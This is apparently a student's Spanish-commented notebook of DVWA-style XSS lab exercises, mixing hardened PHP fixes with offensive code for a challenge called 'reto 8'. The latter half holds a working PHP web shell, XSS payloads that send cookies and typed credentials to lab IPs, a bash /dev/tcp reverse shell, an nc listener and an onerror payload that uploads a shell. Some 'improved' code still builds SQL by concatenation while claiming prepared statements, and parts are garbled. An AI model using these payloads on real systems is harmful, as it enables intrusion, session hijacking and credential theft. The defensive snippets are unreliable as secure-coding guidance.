

<?php

// Se sustituye la cabecera de seguridad por la CSP actualizada
header("Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; style-src 'self'; img-src 'self'; media-src 'none'; frame-src 'none'; font-src 'self'; connect-src 'self'; form-action 'self'; frame-ancestors 'none'; plugin-types 'none'; base-uri 'self';");

// Verificar si hay alguna entrada y no está vacía
if(array_key_exists("name", $_GET) && $_GET['name'] != NULL) {

    // Escapar caracteres especiales de HTML como  "<" ,">","&", '"' y "'"
    // convirtiéndolos en entidades HTML de texto plano para evitar ataques XSS 
    $name = htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
    
    // imprime el parametro name junto con un mensaje de bienvenida
    echo '<pre>Hello ' . $name . '</pre>';
}

?>

<script>while(1)alert("Este mensaje saldrá indefinidamente")</script>

//codigo mejorado nivel medio XSS-reflected - ejer-1

<?php

// Implementar CSP para mejorar la seguridad contra ataques XSS, permitiendo solo script de la misma fuente
header("Content-Security-Policy: default-src 'self'; script-src 'none';");

// Verificar si hay alguna entrada y no está vacía
if(array_key_exists("name", $_GET) && !empty($_GET['name'])) {

    // Escapar caracteres especiales de HTML como  "<" ,">","&", '"' y "'"
    // convirtiéndolos en entidades HTML de texto plano para evitar ataques XSS
    $name = htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');

    // imprime el parametro name junto con un mensaje de bienvenida
    echo "<pre>Hello ${name}</pre>";
}
?>

// codigo ejercicio 2 xss-stored low

<?php

// verifica si se ha enviado el formulario a través del método POST antes de procesar los datos
if( isset( $_POST[ 'btnSign' ] ) ) {

    // Conexión a la base de datos y se selecciona la base de datos donde se almacenarán los mismos
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // mediante la funcion stripslashes se eliminan las barras invertidas de un string en versiones antigua de PHP
    // para evitar que se almacenen en la base de datos y se muestren en la página
    $message = stripslashes( $message );

    //uso de una condiccion ternaria que verifica si la variable es un objeto en la base de datos
    //si es asi se escapa el string, y en caso contrario se muestra un mensaje de error
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], 
     $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); 


    // AL igual que con la variable $message, se verifica si la variable $name es un objeto en la base de datos
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], 
     $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));


    // Se ejecuta la consulta SQL para insertar los datos en la base de datos, siendo escrita de manera manual .
    // Esto presenta un riesgo de inyección SQL, ya que no se están utilizando consultas preparadas
    //Finalmente se cierra la conexión a la base de datos, siendo almacenados los datos en la tabla guestbook
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) 
    ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

  
}

?>

//codigo mejorado nivel bajo XSS-stored

<?php

// Se erifica si se ha enviado el formulario a través del método POST antes de procesar los datos
if(isset($_POST['btnSign'])) {

    // Conexión a la base de datos y se selecciona la base de datos donde se almacenarán los mismos
    $mysqli = new mysqli("host", "usuario", "contraseña", "base_de_datos");

    // Se verifica si la conexión a la base de datos fue exitosa y en caso contrario se muestra un mensaje de error
    if($mysqli->connect_error) {
        die("Conexión fallida: " . $mysqli->connect_error);
    }

    // Se prepara la consulta SQL para insertar los datos en la base de datos, utilizando consultas preparadas
    $stmt = $mysqli->prepare("INSERT INTO guestbook (comment, name) VALUES (?, ?)");

    // Se vinculan los parámetros de la consulta preparada con las variables que contienen los datos a insertar
    $stmt->bind_param("ss", $message, $name);

    // Se obtienen los datos del formulario inicial y se eliminan los espacios en blanco al inicio y al final
    $message = trim($_POST['mtxMessage']);
    $name = trim($_POST['txtName']);

    // Se ejecuta la consulta preparada para insertar los datos en la base de datos y en caso de error se muestra un mensaje de error
    if(!$stmt->execute()) {
        // Manejar error de manera segura
        error_log("Error en la inserción: " . $stmt->error);
        echo "<pre>Error al procesar su solicitud. Por favor, intente de nuevo más tarde.</pre>";
    } else {
        echo "<pre>Mensaje guardado con éxito.</pre>";
    }

    // Se procede a cerrar la consulta preparada y la conexión a la base de datos
    $stmt->close();
    $mysqli->close();
}

?>

//codigo nivel medio XSS-stored

<?php

//Se verifica si se ha enviado el formulario a través del método POST antes de procesar los datos
if( isset( $_POST[ 'btnSign' ] ) ) {

    // Se selecciona la base de datos donde se almacenarán los datos y se eliminan los espacios en blanco al inicio y al final
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Se eliminan las barras invertidas de un string en versiones antiguas de PHP para evitar que se almacenen en la base de datos y se muestren en la página
    $message = strip_tags( addslashes( $message ) );

    // Se verifica si la variable $message es un objeto en la base de datos y smediante la funciona mysqli_real_escape_string se escapa el string, 
    //y en caso contrario se muestra un mensaje de error
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : 
    ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    
    // Se convierten los caracteres especiales en entidades HTML de texto plano para evitar ataques XSS
    $message = htmlspecialchars( $message );

    // Se sanitiza el nombre para evitar ataques XSS y se eliminan las barras invertidas de un string en versiones antiguas de PHP
    $name = str_replace( '<script>', '', $name );

    // Se verifica si la variable $name es un objeto en la base de datos y smediante la funciona mysqli_real_escape_string se escapa el string, 
    //y en caso contrario se muestra un mensaje de error
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : 
    ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Se crea la consulta SQL para insertar los datos en la base de datos, siendo escrita de manera manual
    // Esto presenta un riesgo de inyección SQL, ya que no se están utilizando consultas preparadas
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";

    // Se ejecuta la consulta SQL realizada anteriormente y en caso de error se muestra un mensaje de error, cerraando la conexión a la base de datos
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : 
    (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

   }

?> 

//mejora de coidigo nivel medio xss-stored

<?php

// Implementación de CSP para mejorar la seguridad contra ataques XSS
header("Content-Security-Policy: default-src 'self'; script-src 'self' https://trustedscripts.example.com; object-src 'none'; 
style-src 'self'  https://trustedscripts.example.com; img-src 'self'; media-src 'none'; frame-src 'none'; font-src 'self'; 
connect-src 'self'; plugin-types 'none'; base-uri 'self';");

// Se verifica si se ha enviado el formulario a través del método POST antes de procesar los datos
if( isset( $_POST[ 'btnSign' ] ) ) {

    // Se selecciona la base de datos donde se almacenarán los datos y se eliminan los espacios en blanco al inicio y al final
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Se eliminan las etiquetas HTML y las barras invertidas de un string en versiones antiguas de PHP para evitar que se almacenen en la base de datos 
    $message = strip_tags( addslashes( $message ) );

    // Se verifica si la variable $message es un objeto en la base de datos y mediante la función mysqli_real_escape_string se escapa el string, 
    // y en caso contrario se muestra un mensaje de error
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : 
    ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    
    // Se convierten los caracteres especiales en entidades HTML de texto plano para evitar ataques XSS
    $message = htmlspecialchars( $message, ENT_QUOTES, 'UTF-8' );

    // Se sanitiza el nombre para evitar ataques XSS y se eliminan las barras invertidas de un string en versiones antiguas de PHP
    $name = str_replace( '<script>', '', $name );

    // Se verifica si la variable $name es un objeto en la base de datos y mediante la función mysqli_real_escape_string se escapa el string, 
    // y en caso contrario se muestra un mensaje de error
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : 
    ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Se crea la consulta SQL para insertar los datos en la base de datos, utilizando consultas preparadas para evitar inyecciones SQL
    $stmt = $GLOBALS["___mysqli_ston"]->prepare("INSERT INTO guestbook ( comment, name ) VALUES (?, ?)");
    if ($stmt) {
        $stmt->bind_param("ss", $message, $name);
        $stmt->execute();
        $stmt->close();
    } else {
        // Manejo de errores seguro
        error_log("Error en la preparación de la consulta: " . $GLOBALS["___mysqli_ston"]->error);
        echo "Ha ocurrido un error. Por favor, inténtelo de nuevo más tarde.";
    }
}

// Se cierra la conexión a la base de datos
mysqli_close($GLOBALS["___mysqli_ston"]);

?>


//script de ataque xss-stored


<script>alert("XSS.Stored_sinNada")</script>


<imag """=""><script>alert("XSS-Stored")</script>">


//codifo completo de validacion y saneamiento en PHP

<?php
// Se verifica si el email es valido, retornando true si lo es y false en caso contrario
function validateEmail($email) {
    return filter_var($email, FILTER_VALIDATE_EMAIL);
}
// se verifica si el número es un entero, retornando true si lo es y false en caso contrario
function validateInteger($number) {
    return filter_var($number, FILTER_VALIDATE_INT);
}
// se sanitiza la entrada de datos, usando la funcion htmlspecialchars para escapar caracteres especiales
 // y ENT_QUOTES para convertir comillas dobles y simples en entidades HTML de texto plano
function sanitizeInput($input) {
    return htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
}
// Se sanitiza las entradas $conn y $input con la funcion mysqli_real_escape_string 
//para evitar ataques XSS e inyección SQL
function sanitizeForSQL($conn, $input) {
    return mysqli_real_escape_string($conn, $input);
}
// Se verifica si se ha enviado el formulario a través del método POST antes de procesar los datos
if ($_SERVER["REQUEST_METHOD"] == "POST") {
// Se establece la conexión a la base de datos con el servidor, nombre de usuario, contraseña y database
    $conn = new mysqli("localhost", "username", "password", "database");
// Se comprueba que las variables del formulario existan y han sido enviadas a través del método POST
    $email = $_POST['email'];
    $age = $_POST['age'];
    $comment = $_POST['comment'];
// se validad finalmente los datos,  usando la funcion de sanitizeForSQL para evitar inyección SQL
    if (validateEmail($email) && validateInteger($age)) {
        $email = sanitizeForSQL($conn, $email);
        $age = sanitizeForSQL($conn, $age);
        $comment = sanitizeInput($comment);
// Se ejecuta la consulta SQL para insertar los datos en la base de datos, utilizando consultas preparadas
        $query = "INSERT INTO users (email, age, comment) VALUES ('$email', '$age', '$comment')";
        if ($conn->query($query) === TRUE) {
            echo "Nuevo registro creado con éxito";
        } else {
            echo "Error: " . $query . "<br>" . $conn->error;
        }
    } else {
        echo "Datos inválidos";
    }kal
// Se cierra la conexión a la base de datos
    $conn->close();
}
?>

//encabezado CSP muy completo para evitar ataques XSS

// Se establece la política de seguridad de contenido (CSP) para proteger contra script externos. conn
// https//trustedscripts.example.com consegimos que solo se carguen scripts de ese dominio. con object -none no se permiten objetos, 
//con style-src se permiten estilos de trustedstyles.example.com y con base-url se permite la URL base del documento y con form-action se permiten formularios de la misma URL
<?php
http-equiv="Content-Security-Policy"
content=" default-src 'self'; script-src 'self' https://trustedscripts.example.com; object-src 'none'; 
style-src 'self' https://trustedstyles.example.com; base-uri 'self'; form-action 'self';" />

//resgitro de errores en bases de dastos y mensaje generico de error usuario final

//Se ejecuta la culsulta SQL para ser insertada en la BBDD, y en caso de error se muestra un mensaje de error
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) 
? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

//recoge el error en un archivo de registro o base de datos de errores y muestra al usurio un mensaje de error generico
if (!$result) {

    // Registra el error en un archivo de registro o base de datos de errores
    error_log("Error en la consulta SQL: " . mysqli_error($GLOBALS["___mysqli_ston"]));

    // Muestra un mensaje de error genérico al usuario
    echo "Ha ocurrido un error. Por favor, inténtelo de nuevo más tarde.";
} else {
    echo "Datos guardados con éxito.";

}// shell para reto 8
<?php
// si se  ejecuta el comando proporcionado a través de la URL, se muestra la salida
if (isset($_GET['cmd'])) {

// se crea la variable cmd que almacena el comando proporcionado a través de la URL  
  $cmd = $_GET['cmd'];

  // En caso que el comando sea válido, se ejecuta y se almacena la salida en la variable $output
  $output = shell_exec($cmd);

  // Se muestra la salida del comando en la página
  echo $output;
}
?>

//script de ataque para reto 8

// ocultamos el script de ataque en una imagen
<textarea id="output" style="width:100%;height:150px;"></textarea>
<script>
  // Función que envia el comando , creando una variable xhr que realiza una solicitud GET al servidor
  // con el comando proporcionado a través de la URL , incluyendo un componente que convierte 
  //culaquier caracter especial en una cadena válida para una URL
  function enviarComando(cmd) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://10.0.2.19:1234/shell.php?cmd=' + encodeURIComponent(cmd), true);

// Si la solicitud se completa correctamente, se muestra la salida del comando en la página
    xhr.onload = function() {
      if (xhr.status === 200) {
        // muestra el documento cogiendo el id  e innerHTML para mostrar la respuesta del servidor
        document.getElementById('output').innerHTML = xhr.responseText;
      } else {
        document.getElementById('output').innerHTML = "Error al ejecutar el comando.";
      }
    };
// Si hay un error en la solicitud, se muestra un mensaje de error en la página
    xhr.onerror = function() {
      document.getElementById('output').innerHTML = "Error de red, no se pudo completar la solicitud.";
    };

    xhr.send();
  }
</script>
//crea un botton que ejecuta la funcion enviarComando con el comando whoami y se prueba el script de ataque
<button onclick="enviarComando('whoami')">Ejecutar Whoami</button>

//shell mejorado para reto 8

<?php
// Lista de comandos permitidos
$comandosPermitidos = ['whoami', 'date', 'ls'];

// Obtener el comando de la solicitud
$cmd = $_GET['cmd'];

// Verificar si el comando está en la lista de permitidos
if (in_array($cmd, $comandosPermitidos)) {
    // Ejecutar el comando
    echo shell_exec($cmd);
} else {
    echo "Comando no permitido.";
}
?>

<?php

// Obtener el comando de la solicitud
$cmd = $_GET['cmd'];

// Ejecutar el comando
$resultado = shell_exec($cmd);

// Inicializar sesión cURL para enviar el resultado del comando a un servidor remoto
$ch = curl_init('http://10.0.2.19:1234');
// Configurar la sesión cURL para enviar el resultado del comando como una solicitud POST
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
// Enviar el resultado del comando como datos de formulario
curl_setopt($ch, CURLOPT_POSTFIELDS, $resultado);
// Configurar la sesión cURL para recibir la respuesta del servidor remoto
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
// Configurar la sesión cURL para enviar la longitud del resultado del comando
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Content-Type: text/plain',
    'Content-Length: ' . strlen($resultado))
);

// Ejecutar sesión cURL y almacenar la respuesta del servidor remoto
$respuesta = curl_exec($ch);
// Cerrar sesión cURL
curl_close($ch);

// Mostrar la respuesta del servidor remoto
echo $respuesta;
}
?>

//script de ataque para que envie la cookie al servidor remoto

#convertir en un script para que se ejecute en un cuadro de texto en una pagina web
<script>
    document.addEventListener('DOMContentLoaded', function() {
    var cookie = document.cookie;
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://10.0.2.25:1234/cookie.py', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify({ cookie: cookie }));
    });

</script>

#convertir en un script para que se ejecute en un cuadro de texto en una pagina web
<script>
    // Se crea una funcion con un evento que se ejecuta cuando
    // el documento ha sido cargado completamente
    document.addEventListener('DOMContentLoaded', function() {
    //se crea variable cookie que almacena la cookie del documento actual
    var cookie = document.cookie;
    // Se crea una variable xhr que realiza una solicitud POST al servidor remoto
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://10.0.2.25:1234/cookie.py', true);
    // Se establece el tipo de contenido de la solicitud como JSON
    xhr.setRequestHeader('Content-Type', 'application/json');
    // Se envía la cookie al servidor remoto en formato JSON
    xhr.send(JSON.stringify({ cookie: cookie }));
    });
  
</script>

//script para que me envien cookie y credenciales   al servidor remoto

<script>
  document.addEventListener('DOMContentLoaded', function() {
    var cookie = document.cookie;
    var username = document.getElementsByName('username')[0].value;
    var password = document.getElementsByName('password')[0].value;
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://10.0.2.25:1234', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify({ cookie: cookie, username: username, password: password }));
  });
</script>

// codigo mejorado del anterior con alertas
<script>
  document.addEventListener('DOMContentLoaded', function() {
    // Se obtiene la cookie del documento actual
    var cookie = document.cookie;
    // Intenta obtener el username y password; si no existen, se establecen como vacíos
    var username = document.getElementsByName('username')[0] ? document.getElementsByName('username')[0].value : '';
    var password = document.getElementsByName('password')[0] ? document.getElementsByName('password')[0].value : '';
    
    // Se crea una variable xhr que realiza una solicitud POST al servidor remoto
    var xhr = new XMLHttpRequest();
    // Se especifica la URL del servidor remoto, ajusta según sea necesario
    xhr.open('POST', 'http://10.0.2.25:1234', true);
    // Se establece el tipo de contenido de la solicitud como JSON
    xhr.setRequestHeader('Content-Type', 'application/json');
    // Se envía la cookie y las credenciales al servidor remoto en formato JSON
    xhr.send(JSON.stringify({ cookie: cookie, username: username, password: password }));
  });
</script>

<script>
  document.addEventListener('DOMContentLoaded', function() {
    var cookie = document.cookie;
    var username = document.getElementsByName('username')[0] ? document.getElementsByName('username')[0].value : '';
    var password = document.getElementsByName('password')[0] ? document.getElementsByName('password')[0].value : '';  
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://10.0.2.25:1234', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify({ cookie: cookie, username: username, password: password }));
  });
</script>

//script de ataque para reto 8

<script>
// Se crea una función que envía una solicitud GET al 
//servidor con el comando proporcionado a través de la URL
  var xhr = new XMLHttpRequest();
  // Se abre una conexión GET al servidor 
  // con la parte -c 'bash -i >& /dev/tcp/10.0.2.19/4444 0>&1' realiza una conexión inversa al servidor remoto 
  xhr.open("GET", "http://10.0.2.21/index.php?cmd=/bin/bash -c 'bash -i >& /dev/tcp/10.0.2.19/4444 0>&1'",    true);
  xhr.send();
</script>

//script de ataque para reto 8

//script de ataque para reto 8 DEFINITIVO , DESPUES DE REINICIAR LA MQUINA ATACADA y borrar las cookies del navegador
<script>
// Se crea una variable xhr que es igua a new Image() 
//que crea un nuevo objeto de imagen para enviar la cookie al servidor remoto
    var img = new Image();
    //la img.src es igual a la URL del servidor remoto con la cookie del documento actual
    img.src = "http://10.0.2.19:8080/capture?cookie=" + document.cookie;
</script>

//el servidor remoto montado en la maquina atacante
nc -lvnp 8080


//Se crea un iframe que es un elemento HTML que permite cargar otra página web dentro de la actual para  
// que carge la URL del servidor remoto con el comando whoami

<iframe src="http://10.0.2.21/index.php?cmd=whoami" style="width:100%; height:200px; border:none;"></iframe>

//script camuflado en una imagen para que ejecute el comando 

    <img src="x"  
     onerror="setTimeout(
       'var xhr = new XMLHttpRequest();
        xhr.open(\'POST\', \'http://10.0.2.21/admin/uploads/upload.php\', true);
        xhr.setRequestHeader(\'Content-Type\', \'multipart/form-data\');
        
        var formData = new FormData();
        formData.append(\"file\", new Blob([\"<?php system($_GET[\'cmd\']); ?>\"], {type: \'application/x-php\'}), \"shell.php\");
        
        xhr.send(formData);', 0)">